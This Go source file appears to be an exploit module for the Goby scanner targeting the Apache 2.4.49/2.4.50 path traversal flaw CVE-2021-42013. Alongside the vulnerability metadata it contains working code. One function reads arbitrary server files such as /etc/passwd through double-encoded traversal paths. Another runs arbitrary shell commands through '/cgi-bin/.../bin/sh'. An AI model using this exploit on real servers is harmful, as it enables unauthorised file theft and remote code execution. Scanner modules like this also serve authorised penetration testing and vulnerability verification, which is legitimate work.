package exploits

import (
	"bufio"
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache 2.4.49 2.4.50 Path Traversal (CVE-2021-42013)",
    "Description": "<p>Apache is a web server software.</p><p>It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts, this may lead to remote code execution by an attacker.</p>",
    "Impact": "Apache 2.4.49 2.4.50 Path Traversal (CVE-2021-42013)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
    "Product": "Apache",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache 2.4.49 2.4.50 版本目录穿越漏洞（CVE-2021-42013）",
            "Description": "<p>Apache是一款Web服务器软件。</p><p> Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源，进而可能导致攻击者实现远程代码执行。</p>",
            "Impact": "<p> Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源，进而可能导致攻击者实现远程代码执行。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
            "Product": "Apache",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Apache 2.4.49 2.4.50 Path Traversal (CVE-2021-42013)",
            "Description": "<p>Apache is a web server software.</p><p><span style=\"font-size: 16.96px;\">It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient.</span>&nbsp;An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts, this may lead to remote code execution by an attacker.</p>",
            "Impact": "Apache 2.4.49 2.4.50 Path Traversal (CVE-2021-42013)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\" target=\"_blank\">https://httpd.apache.org/security/vulnerabilities_24.html</a><br></p>",
            "Product": "Apache",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "banner=\"apache/2.4.50\" || banner=\"apache/2.4.49\"",
    "GobyQuery": "banner=\"apache/2.4.50\" || banner=\"apache/2.4.49\"",
    "Author": "keeeee",
    "Homepage": "https://apache.org/",
    "DisclosureDate": "2021-10-08",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
        "https://twitter.com/roman_soft/status/1446252280597078024"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-41773"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "readFile,execCmd",
            "show": ""
        },
        {
            "name": "file",
            "type": "input",
            "value": "/etc/passwd",
            "show": "AttackType=readFile"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=execCmd"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "Apache"
        ],
        "Hardware": []
    },
    "PocId": "7318"
}`

	sendPayload := func(conn net.Conn, payload string) (*http.Response, error) {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			return nil, err
		}
		resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
		return resp, err
	}
	readFile := func(u *httpclient.FixUrl, filePath string) string {
		conn, err := httpclient.GetTCPConn(u.HostInfo)
		if err != nil {
			return ""
		}
		defer conn.Close()
		payload := "GET "
		payload += "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/" + filePath
		payload += " HTTP/1.1\r\n"
		payload += "Host: " + u.HostInfo + "\r\n"
		payload += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n"
		resp, err := sendPayload(conn, payload)
		if err == nil && resp.StatusCode == 200 {
			if rawBody, err := ioutil.ReadAll(resp.Body); err == nil {
				return string(rawBody)
			}
		}
		return ""
	}
	execCmd := func(u *httpclient.FixUrl, cmd string) string {
		conn, err := httpclient.GetTCPConn(u.HostInfo)
		if err != nil {
			return ""
		}
		defer conn.Close()
		body := "echo Content-Type: text/plain; echo; " + cmd
		payload := "POST "
		payload += "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
		payload += " HTTP/1.1\r\n"
		payload += "Host: " + u.HostInfo + "\r\n"
		payload += "Content-Type: application/x-www-form-urlencoded\r\n"
		payload += fmt.Sprintf("Content-Length: %s\r\n", strconv.Itoa(len(body)))
		payload += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n"
		payload += body
		resp, err := sendPayload(conn, payload)
		if err == nil && resp.StatusCode == 200 {
			if rawBody, err := ioutil.ReadAll(resp.Body); err == nil {
				return string(rawBody)
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randHex := goutils.RandomHexString(6)
			rawBody2 := execCmd(u, fmt.Sprintf("echo -n %s|md5sum", randHex))
			if strings.Contains(rawBody2, fmt.Sprintf("%x", md5.Sum([]byte(randHex)))) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["AttackType"].(string)
			if attackType == "readFile" {
				filename := ss.Params["file"].(string)
				rawBody := readFile(expResult.HostInfo, filename)
				if len(rawBody) > 0 {
					expResult.Success = true
					expResult.Output = rawBody
				}
			} else if attackType == "execCmd" {
				cmd := ss.Params["cmd"].(string)
				rawBody := execCmd(expResult.HostInfo, cmd)
				if len(rawBody) > 0 {
					expResult.Success = true
					expResult.Output = rawBody
				}
			}
			return expResult
		},
	))
}
